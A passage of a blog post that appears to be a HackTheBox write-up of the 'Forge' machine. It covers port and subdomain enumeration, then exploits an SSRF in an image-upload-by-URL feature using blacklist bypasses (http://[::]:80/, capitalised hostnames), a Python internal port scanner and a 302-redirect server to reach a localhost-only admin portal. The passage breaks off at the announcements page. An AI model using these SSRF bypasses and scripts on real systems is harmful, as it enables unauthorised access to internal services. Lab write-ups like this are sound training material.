<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Forge [HTB]" /><meta property="og:locale" content="en" /><meta name="description" content="Forge" /><meta property="og:description" content="Forge" /><link rel="canonical" href="https://vx86.github.io/posts/forge/" /><meta property="og:url" content="https://vx86.github.io/posts/forge/" /><meta property="og:site_name" content="Vx86 Cybersec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-06T09:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Forge [HTB]" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Forge","url":"https://vx86.github.io/posts/forge/","headline":"Forge [HTB]","dateModified":"2022-03-06T09:00:00+01:00","datePublished":"2022-03-06T09:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://vx86.github.io/posts/forge/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Forge [HTB] | Vx86 Cybersec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Vx86 Cybersec"><meta name="application-name" content="Vx86 Cybersec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/26335498?s=400&u=33a3504847698340f88f46e6920a4b1b6e6df89a&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Vx86 Cybersec</a></div><div class="site-subtitle font-italic">Security blog about CTF Write-ups, Researches, Tools and such</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Vx86" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Forge [HTB]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Forge [HTB]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Vx86 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 6, 2022, 9:00 AM +0100" >Mar 6<i class="unloaded">2022-03-06T09:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1946 words">10 min read</span></div></div><div class="post-content"><h1 id="forge">Forge</h1><p><img data-proofer-ignore data-src="/assets/img/forge/forge_banner.png" alt="forge_banner" /></p><p><a href="https://app.hackthebox.com/machines/376">Forge</a> is a medium linux machine on HackTheBox and is today’s target.</p><h2 id="recon">Recon</h2><p>As always, we start with network discovery with a nmap scan.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#nmap -sC -sV -p- 10.129.190.159 -vv</span>
PORT   STATE    SERVICE REASON      VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0<span class="o">=</span>
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y<span class="o">=</span>
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open     http    syn-ack     Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: Host: 10.129.190.159<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><h3 id="http---port-80">HTTP - Port 80</h3><p>Searching for subdomains with <code class="language-plaintext highlighter-rouge">wfuzz</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                      
<span class="o">=====================================================================</span>

000000024:   200        1 L      4 W        27 Ch       <span class="s2">"admin"</span>                      
000009532:   400        12 L     53 W       427 Ch      <span class="s2">"#www"</span>                       
000010581:   400        12 L     53 W       427 Ch      <span class="s2">"#mail"</span>                      
000047706:   400        12 L     53 W       427 Ch      <span class="s2">"#smtp"</span>                      
000103135:   400        12 L     53 W       427 Ch      <span class="s2">"#pop3
</span></pre></table></code></div></div><p>As the previous nmap scan told us, the webapp is accessible through its domain name : <code class="language-plaintext highlighter-rouge">http://forge.htb</code> and <code class="language-plaintext highlighter-rouge">http://admin.forge.htb</code>, we need to add the host to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><h3 id="domain--forgehtb">Domain : forge.htb</h3><p>Looking for subdirectories with <code class="language-plaintext highlighter-rouge">gobuster</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">===============================================================</span>
2021/11/28 21:03:14 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 224] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://forge.htb/uploads/]
/static               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 307] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://forge.htb/static/] 
/upload               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 929] 
</pre></table></code></div></div><p>The webapp has an upload image feature in <code class="language-plaintext highlighter-rouge">/upload</code>, where we can upload an image through two different methods : local file or url.</p><p>Javascript source code</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">show_upload_local_file</span><span class="p">(</span><span class="nx">argument</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">form_div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">form-div</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">form_div</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`
        &lt;form action="/upload" method="POST" enctype="multipart/form-data"&gt;
            &lt;input type="file" name="file" class="file"&gt;
            &lt;input name="local" type="hidden" value='1'&gt;
            &lt;br&gt;
            &lt;br&gt;
            &lt;button id="submit-local" type="submit" class="submit"&gt;Submit&lt;/button&gt;
        &lt;/form&gt;
        `</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">show_upload_remote_file</span><span class="p">(</span><span class="nx">argument</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">form_div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">form-div</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">form_div</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`
    &lt;br&gt;&lt;br&gt;
        &lt;form action="/upload" method="POST" enctype="application/x-www-form-urlencoded" &gt;
            &lt;input type="textbox" name="url" class="textbox"&gt;
            &lt;input name="remote" type="hidden" value='1'&gt;
            &lt;br&gt;
            &lt;br&gt;
            &lt;button id="submit-remote" type="submit" class="submit"&gt;Submit&lt;/button&gt;
        &lt;/form&gt;
        `</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When uploading an image through local file, the webapp change the filename to a random string and displays the path where the file has been stored.</p><p>eg: <a href="http://forge.htb/uploads/JWknEqSGbTqCPncyFD7D">http://forge.htb/uploads/JWknEqSGbTqCPncyFD7D</a></p><p>When trying to upload an image through url, the server displays an error message like :</p><pre><code class="language-txt">An error occured! Error : HTTPSConnectionPool(host='img1.freepng.fr', port=443): Max retries exceeded with url: /20180330/yfq/kisspng-tux-racer-t-shirt-linux-kernel-linux-5abe16231f3e90.888396341522406947128.jpg (Caused by NewConnectionError('&lt;urllib3.connection.HTTPSConnection object at 0x7f903482eb80&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
</code></pre><p>When a web server tries to request an URL the user has the control of, it could be interesting to check for Server-Side Request Forgery (SSRF).</p><pre><code class="language-txt">Requesting 127.0.0.1 -&gt; Invalid protocol! Supported protocols: http, https
Requesting http://127.0.0.1 -&gt; URL contains a blacklisted address!
</code></pre><p>The server has some filters we could try to bypass : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">PayloadAllTheThings - CSRF</a></p><p><code class="language-plaintext highlighter-rouge">http://[::]:80/</code> yields a good response from the server in a form of a url with a random filename just like it did with local file upload.</p><p>The server cannot display the image because the result is not an image BUT it is the HTTP response from the server request.</p><p>We can download it with <code class="language-plaintext highlighter-rouge">wget</code> and display the content in our terminal.</p><p>Knowing the SSRF is present, we could try to scan internal port to see if potential vulnerable services are running.</p><p>Port scanning through SSRF</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">'http://forge.htb/upload'</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Starting scan...'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65535</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'url'</span><span class="p">:</span><span class="s">'http://[::]:{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span><span class="p">),</span><span class="s">'remote'</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">'html.parser'</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'center'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">&lt;</span> <span class="mi">304</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'center'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">309</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Port {} -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span><span class="p">,</span><span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'center'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))</span>
</pre></table></code></div></div><p>Result (false positive)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>python3 csrf_scan.py                                                                130 ⨯
Starting scan...
Port 22 -&gt; &lt;center&gt;
&lt;strong&gt;An error occured! Error : <span class="o">(</span><span class="s1">'Connection aborted.'</span>, BadStatusLine<span class="o">(</span><span class="s1">'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n'</span><span class="o">))</span>&lt;/strong&gt;
&lt;/center&gt;
Port 80 -&gt; &lt;center&gt;
&lt;strong&gt;File uploaded successfully to the following url:&lt;/strong&gt;
&lt;/center&gt;
Port 37820 -&gt; &lt;center&gt;
&lt;strong&gt;An error occured! Error : <span class="o">(</span><span class="s1">'Connection aborted.'</span>, BadStatusLine<span class="o">(</span><span class="s1">'GET / HTTP/1.1\r\n'</span><span class="o">))</span>&lt;/strong&gt;
&lt;/center&gt;
</pre></table></code></div></div><p>Port 37820 gives a response but it was a false positive, othen than that all ports except the one we saw in nmap are closed.</p><p>The server can also request our own python3 HTTP server.</p><pre><code class="language-txt">python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.190.159 - - [28/Nov/2021 21:09:16] "GET / HTTP/1.1" 200 -
</code></pre><p>We can create a small python3 server that will redirect traffic to the target to bypass some restrictions like protocols used (gopher,file,…)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"""
Usage: {} &lt;port_number&gt; &lt;url&gt;
    """</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="k">class</span> <span class="nc">Redirect</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
   <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Location'</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
   <span class="k">def</span> <span class="nf">send_error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Location'</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
       <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
<span class="n">HTTPServer</span><span class="p">((</span><span class="s">""</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])),</span> <span class="n">Redirect</span><span class="p">).</span><span class="n">serve_forever</span><span class="p">()</span>
</pre></table></code></div></div><p>Running it with : <code class="language-plaintext highlighter-rouge">python3 redirect.py 4444 "gopher://127.0.0.1"</code></p><p>The server answers with a different error, not erroring on protocols</p><pre><code class="language-txt">An error occured! Error : No connection adapters were found for 'gopher://127.0.0.1'
</code></pre><p>This error seems to be linked to our python3 web server and is not giving much result. Let’s check the other subdomain.</p><h3 id="domain--adminforgehtb">Domain : admin.forge.htb</h3><p>The server only displays a sentence : <code class="language-plaintext highlighter-rouge">Only localhost is allowed</code></p><p>We could be able to request this subdomain using the SSRF on <code class="language-plaintext highlighter-rouge">forge.htb</code></p><p>When trying to send the payload : <code class="language-plaintext highlighter-rouge">http://admin.forge.htb</code>, the server answers with <code class="language-plaintext highlighter-rouge">URL contains a blacklisted address!</code> but a payload like : <code class="language-plaintext highlighter-rouge">http://admin.Forge.htb</code> (with a capital letter) seems to bypass the restriction.</p><p>We download the file and display the content :</p><p>admin.forge.htb</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Admin Portal<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;center&gt;&lt;h1&gt;</span>Welcome Admins!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span> 
</pre></table></code></div></div><p>Using the same method, we can check <code class="language-plaintext highlighter-rouge">/announcements</code> page.</p><p>admin.forge.htb/announcements</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Announcements<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
